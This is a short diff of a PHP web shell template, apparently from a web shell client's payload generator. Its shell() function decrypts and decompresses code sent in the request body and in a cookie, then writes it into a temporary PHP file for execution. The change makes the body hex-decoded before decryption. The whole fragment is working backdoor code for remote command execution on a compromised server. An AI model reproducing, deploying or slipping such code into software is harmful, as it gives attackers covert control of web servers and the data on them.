@@ -20,7 +20,7 @@ function decrypt($key,$str){
 function shell() {
 	@ob_start();
 	$key='{{key}}';
-	$mod=@gzuncompress(decrypt($key,file_get_contents('php://input')));
+	$mod=@gzuncompress(decrypt($key,pack('H*',@file_get_contents('php://input'))));
 	$cmd=@gzuncompress(decrypt($key,pack('H*',@$_COOKIE['{{action}}'])));
 	$tmp=tempnam(null,null);
 	file_put_contents($tmp,'<?php '.$mod.$cmd.' ?>');
